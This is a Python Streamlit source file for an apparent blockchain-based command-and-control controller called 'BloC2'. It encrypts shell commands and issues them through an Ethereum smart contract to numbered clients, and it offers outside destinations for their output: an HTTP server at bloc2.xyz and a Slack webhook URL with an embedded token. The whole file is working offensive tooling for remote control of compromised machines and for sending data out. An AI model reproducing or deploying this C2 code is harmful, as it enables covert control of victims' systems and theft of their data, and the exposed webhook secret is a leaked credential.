import os
import json
import base64
import configparser
import streamlit as st
from web3 import Web3
from pathlib import Path
from cryptography.fernet import Fernet

# Parse Config
config = configparser.ConfigParser()
config.read('server.conf')

# Define and connect a new Web3 provider
w3 = Web3(Web3.HTTPProvider(config['DEFAULT']['Web3ProviderUri']))

# Cache the contract on load
@st.cache(allow_output_mutation=True)
# Define the load_contract function
def load_contract():

    # Load ABI
    with open(Path('../contracts/bloc2_abi.json')) as f:
        bloc2_abi = json.load(f)

    # Set the contract address (this is the address of the deployed contract)
    contract_address = config['DEFAULT']['SmartContractAddress']

    # Get the contract
    contract = w3.eth.contract(
        address=contract_address,
        abi=bloc2_abi
    )
    # Return the contract from the function
    return contract

# Load the contract
contract = load_contract()

def encrypt_command(client_id, command, response_type, response_dest):

    # Structure the command in JSON formatted string
    unencrypted_json = json.dumps({
        'client_id': client_id,
        'command': command,
        'response_type': response_type,
        'response_dest': response_dest,
    })

    # Encrypt the JSON formatted command string
    encryption_key = config['DEFAULT']['CommandEncryptionPassword']
    fernet = Fernet(encryption_key)
    encrypted_json = fernet.encrypt(unencrypted_json.encode())

    return encrypted_json

# List all the possible response types and some example destinations
poss_responses = {
    '/dev/null': '/dev/null',
    'Local File': '/tmp/cmd.out',
    'HTTP Server': 'http://bloc2.xyz',
    'Slack Postback': 'https://hooks.slack.com/services/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',
    'Blockchain': 'http://127.0.0.1:7545',
}

operator_account = config['DEFAULT']['MasterAccountAddress']

st.title('BloC2 Controller')
client_id = st.number_input('Client ID', value=0, step=1)
command = st.text_input('Command to Send', value='uname -a')
response_type = st.selectbox('Where should command output go?', poss_responses.keys())

# Present a new text input if the response destination is not /dev/null
if response_type == '/dev/null':
    response_dest = poss_responses[response_type]
else:
    response_dest = st.text_input('Response Destination', value=poss_responses[response_type])

# Present the "Issue Command" button
if st.button('Issue Command'):
    response_type = response_type.lower().replace(' ', '_')
    # Encrypt the command so that it's unreadable on the blockchain
    encrypted_command = encrypt_command(client_id, command, response_type, response_dest)
    # Issue the command via the contract
    contract.functions.issueCommand(encrypted_command).transact({'from': operator_account, 'gas': 1000000})
